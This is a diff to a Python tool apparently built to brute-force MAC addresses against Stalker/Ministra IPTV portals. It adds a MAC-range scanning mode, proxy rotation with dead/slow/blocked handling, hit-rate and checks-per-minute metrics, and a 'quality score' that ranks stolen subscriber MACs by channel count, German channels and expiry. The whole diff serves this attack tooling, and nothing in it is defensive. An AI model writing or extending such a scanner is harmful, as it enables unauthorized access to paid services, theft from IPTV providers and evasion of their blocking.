@@ -721,6 +1439,13 @@ def create_scanner_state(portal_url, mode="random", mac_list=None, proxies=None,
         found_macs = get_found_macs(portal=portal_url)
         mac_list = [m["mac"] for m in found_macs]
         logger.info(f"Refresh mode: {len(mac_list)} MACs loaded from database for portal {portal_url}")
+    
+    # Handle xscan mode: Generate MAC range
+    elif mode == "xscan":
+        if not mac_range_start or not mac_range_end:
+            raise ValueError("xscan mode requires mac_range_start and mac_range_end")
+        mac_list = generate_mac_range(mac_range_start, mac_range_end)
+        logger.info(f"Xscan mode: {len(mac_list)} MACs generated from {mac_range_start} to {mac_range_end}")
     
     return {
         "id": secrets.token_hex(4),
@@ -741,6 +1466,13 @@ def create_scanner_state(portal_url, mode="random", mac_list=None, proxies=None,
         "scanned_macs": set(),
         "proxies": proxies or [],
         "settings": settings or {},
+        # NEW: Performance Metrics
+        "cpm": 0,  # Checks per Minute
+        "eta_seconds": 0,  # Estimated Time to Arrival
+        "hit_rate": 0.0,  # Hit Rate %
+        "last_cpm_update": time.time(),
+        "checks_since_last_update": 0,
+        "quality_scores": [],  # List of quality scores for hits
     }
 
 
@@ -750,6 +1482,121 @@ def add_scanner_log(state, message, level="info"):
     state["logs"].append({"time": ts, "level": level, "message": message})
     if len(state["logs"]) > 500:
         state["logs"] = state["logs"][-500:]
+
+
+def calculate_cpm(state):
+    """Calculate Checks Per Minute (CPM)"""
+    current_time = time.time()
+    time_diff = current_time - state.get("last_cpm_update", state["start_time"])
+    
+    if time_diff >= 10:  # Update every 10 seconds
+        checks = state.get("checks_since_last_update", 0)
+        if time_diff > 0:
+            cpm = (checks / time_diff) * 60
+            state["cpm"] = int(cpm)
+        state["last_cpm_update"] = current_time
+        state["checks_since_last_update"] = 0
+
+
+def calculate_eta(state):
+    """Calculate Estimated Time to Arrival (ETA) in seconds"""
+    if state["mode"] in ("list", "refresh", "xscan"):
+        total_macs = len(state["mac_list"])
+        tested = state["tested"]
+        remaining = total_macs - tested
+        
+        if remaining > 0 and state["cpm"] > 0:
+            eta_minutes = remaining / state["cpm"]
+            state["eta_seconds"] = int(eta_minutes * 60)
+        else:
+            state["eta_seconds"] = 0
+    else:
+        state["eta_seconds"] = 0  # Infinite for random mode
+
+
+def calculate_hit_rate(state):
+    """Calculate Hit Rate %"""
+    if state["tested"] > 0:
+        state["hit_rate"] = round((state["hits"] / state["tested"]) * 100, 2)
+    else:
+        state["hit_rate"] = 0.0
+
+
+def calculate_quality_score(hit_data):
+    """Calculate quality score for a hit (0-100)
+    
+    Factors:
+    - Channels count (40 points max)
+    - Has DE channels (20 points)
+    - Expiry date (20 points)
+    - Response time (10 points)
+    - Portal type (10 points)
+    """
+    score = 0
+    
+    # Channels (40 points max)
+    channels = hit_data.get("channels", 0)
+    if channels >= 1000:
+        score += 40
+    elif channels >= 500:
+        score += 30
+    elif channels >= 100:
+        score += 20
+    elif channels >= 10:
+        score += 10
+    elif channels >= 1:
+        score += 5
+    
+    # DE channels (20 points)
+    if hit_data.get("has_de", False):
+        score += 20
+    
+    # Expiry (20 points)
+    expiry = hit_data.get("expiry", "")
+    if expiry and expiry != "Unknown":
+        try:
+            # Try to parse expiry date
+            if "day" in expiry.lower() or "tag" in expiry.lower():
+                # Extract days from "X days" or "X Tage"
+                import re
+                days_match = re.search(r'(\d+)', expiry)
+                if days_match:
+                    days = int(days_match.group(1))
+                    if days >= 365:
+                        score += 20
+                    elif days >= 180:
+                        score += 15
+                    elif days >= 90:
+                        score += 10
+                    elif days >= 30:
+                        score += 5
+            else:
+                score += 10  # Has expiry but can't parse
+        except:
+            score += 5
+    
+    # Response time (10 points) - if available
+    response_time = hit_data.get("response_time_ms", 0)
+    if response_time > 0:
+        if response_time < 1000:
+            score += 10
+        elif response_time < 3000:
+            score += 7
+        elif response_time < 5000:
+            score += 5
+        else:
+            score += 2
+    
+    # Portal type (10 points)
+    portal_type = hit_data.get("portal_type", "unknown")
+    if portal_type.startswith("stalker"):
+        score += 10
+    elif portal_type in ("ministra", "infomir"):
+        score += 8
+    elif portal_type != "unknown":
+        score += 5
+    
+    return min(score, 100)  # Cap at 100
 
 
 def run_scanner_attack(attack_id):
@@ -778,8 +1625,8 @@ def run_scanner_attack(attack_id):
     
     add_scanner_log(state, f"Started: {speed} threads, mode={mode}", "info")
     
-    # Log MAC list info for list/refresh modes
-    if mode in ("list", "refresh"):
+    # Log MAC list info for list/refresh/xscan modes
+    if mode in ("list", "refresh", "xscan"):
         add_scanner_log(state, f"MAC list: {len(mac_list)} MACs to scan", "info")
     
     if use_proxies:
@@ -838,7 +1685,7 @@ def run_scanner_attack(attack_id):
                 state["proxy_stats"]["total_configured"] = len(proxies)
             
             # Check if list exhausted
-            if mode in ("list", "refresh") and mac_index >= len(mac_list) and not retry_queue:
+            if mode in ("list", "refresh", "xscan") and mac_index >= len(mac_list) and not retry_queue:
                 if not list_done:
                     add_scanner_log(state, f"List exhausted ({mac_index} MACs submitted)", "info")
                     list_done = True
@@ -863,8 +1710,8 @@ def run_scanner_attack(attack_id):
                 # Priority 1: Retry queue (soft-fail MACs)
                 if retry_queue:
                     mac, retry_count, last_proxy = retry_queue.pop(0)
-                # Priority 2: New MACs from list or refresh
-                elif mode in ("list", "refresh") and mac_index < len(mac_list):
+                # Priority 2: New MACs from list, refresh, or xscan
+                elif mode in ("list", "refresh", "xscan") and mac_index < len(mac_list):
                     mac = mac_list[mac_index]
                     mac_index += 1
                     state["mac_list_index"] = mac_index
@@ -931,6 +1778,9 @@ def run_scanner_attack(attack_id):
                 try:
                     success, result, error_type = future.result()
                     
+                    # Update checks counter for CPM calculation
+                    state["checks_since_last_update"] = state.get("checks_since_last_update", 0) + 1
+                    
                     if success:
                         # HIT!
                         state["tested"] += 1
@@ -946,9 +1796,13 @@ def run_scanner_attack(attack_id):
                         de_genres = [g for g in genres if "DE" in g.upper() or "GERMAN" in g.upper() or "DEUTSCH" in g.upper()]
                         has_de = len(de_genres) > 0
                         
+                        # Detect portal type from response
+                        portal_type = detect_portal_type(portal_url, result.get("raw_response", ""))
+                        
                         hit_data = {
                             "mac": mac,
                             "portal": portal_url,
+                            "portal_type": portal_type,
                             "expiry": expiry,
                             "channels": channels,
                             "genres": genres,
@@ -961,7 +1815,18 @@ def run_scanner_attack(attack_id):
                             "created_at": result.get("created_at"),
                             "client_ip": result.get("client_ip"),
                             "found_at": datetime.now().isoformat(),
+                            "response_time_ms": int(elapsed_ms),
                         }
+                        
+                        # Calculate quality score for this hit
+                        quality_score = calculate_quality_score(hit_data)
+                        hit_data["quality_score"] = quality_score
+                        state["quality_scores"] = state.get("quality_scores", [])
+                        state["quality_scores"].append(quality_score)
+                        
+                        # Calculate average quality
+                        if state["quality_scores"]:
+                            state["avg_quality"] = sum(state["quality_scores"]) / len(state["quality_scores"])
                         
                         state["found_macs"].append(hit_data)
                         
@@ -969,7 +1834,12 @@ def run_scanner_attack(attack_id):
                         batch_writer.add(hit_data)
                         
                         de_icon = " 🇩🇪" if has_de else ""
-                        add_scanner_log(state, f"🎯 HIT! {mac} - {expiry} - {channels}ch{de_icon}", "success")
+                        add_scanner_log(state, f"🎯 HIT! {mac} - {expiry} - {channels}ch{de_icon} - Q:{quality_score}", "success")
+                        
+                        # Update performance metrics
+                        calculate_cpm(state)
+                        calculate_eta(state)
+                        calculate_hit_rate(state)
                     
                     elif error_type:
                         # Proxy error - retry MAC with different proxy
@@ -1054,57 +1924,31 @@ def run_scanner_attack(attack_id):
 
 
 def test_mac_scanner(portal_url, mac, proxy, timeout, connect_timeout=2, require_channels=True, min_channels=1):
-    """Test MAC with channel validation - wrapper for stb.test_mac"""
+    """Test MAC with channel validation - uses optimized stb_scanner"""
     try:
-        # Use existing stb.test_mac if available
-        if hasattr(stb, 'test_mac'):
-            success, result = stb.test_mac(portal_url, mac, proxy, timeout, connect_timeout, require_channels, min_channels)
-            return success, result, None
-        else:
-            # Fallback: basic test using existing stb functions
-            token = stb.getToken(portal_url, mac, proxy)
-            if not token:
-                return False, {"mac": mac, "error": "No token"}, None
+        # Get compatible mode setting
+        settings = get_scanner_settings()
+        compatible_mode = settings.get("macattack_compatible_mode", False)
+        
+        # Use optimized stb_scanner.test_mac (3-Phase logic)
+        success, result = stb_scanner.test_mac(
+            portal_url, mac, proxy, timeout, connect_timeout, 
+            require_channels, min_channels, compatible_mode
+        )
+        return success, result, None
             
-            stb.getProfile(portal_url, mac, token, proxy)
-            expiry = stb.getExpires(portal_url, mac, token, proxy)
-            
-            if not expiry:
-                return False, {"mac": mac, "error": "No expiry"}, None
-            
-            # Get channels
-            channels = stb.getAllChannels(portal_url, mac, token, proxy)
-            genres = stb.getGenreNames(portal_url, mac, token, proxy)
-            
-            channel_count = len(channels) if channels else 0
-            
-            # Channel validation
-            if require_channels and channel_count < min_channels:
-                return False, {
-                    "mac": mac,
-                    "error": f"Only {channel_count} channels (minimum: {min_channels})"
-                }, None
-            
-            result = {
-                "mac": mac,
-                "expiry": expiry,
-                "channels": channel_count,
-                "genres": list(genres.values()) if genres else [],
-            }
-            
-            return True, result, None
-            
+    except stb_scanner.ProxyDeadError as e:
+        logger.debug(f"Proxy dead: {e}")
+        return False, {"mac": mac}, "dead"
+    except stb_scanner.ProxySlowError as e:
+        logger.debug(f"Proxy slow: {e}")
+        return False, {"mac": mac}, "slow"
+    except stb_scanner.ProxyBlockedError as e:
+        logger.debug(f"Proxy blocked: {e}")
+        return False, {"mac": mac}, "blocked"
     except Exception as e:
-        error_str = str(e).lower()
-        if "timeout" in error_str or "timed out" in error_str:
-            return False, {"mac": mac}, "slow"
-        elif "refused" in error_str or "unreachable" in error_str:
-            return False, {"mac": mac}, "dead"
-        elif "403" in error_str or "blocked" in error_str:
-            return False, {"mac": mac}, "blocked"
-        else:
-            logger.error(f"test_mac error: {e}")
-            return False, {"mac": mac}, "unknown"
+        logger.error(f"test_mac error: {e}")
+        return False, {"mac": mac}, "unknown"
 
 
 def generate_portal_name_from_hit(hit_data):
@@ -1271,3 +2115,23 @@ def test_proxies_autodetect_worker(proxies_to_test):
     
     add_proxy_log(f"Done: {len(result_proxies)}/{len(proxies_to_test)} working", "success")
     proxy_state["testing"] = False
+
+
+# ============== GRACEFUL SHUTDOWN ==============
+
+def signal_handler(sig, frame):
+    """Handle shutdown signals gracefully"""
+    logger.info("Shutdown signal received, flushing batch writer...")
+    try:
+        batch_writer.flush()
+        logger.info("Batch writer flushed successfully")
+    except Exception as e:
+        logger.error(f"Error flushing batch writer: {e}")
+    
+    logger.info("Scanner module shutdown complete")
+    sys.exit(0)
+
+# Register signal handlers
+signal.signal(signal.SIGTERM, signal_handler)
+signal.signal(signal.SIGINT, signal_handler)
+logger.info("Signal handlers registered for graceful shutdown")
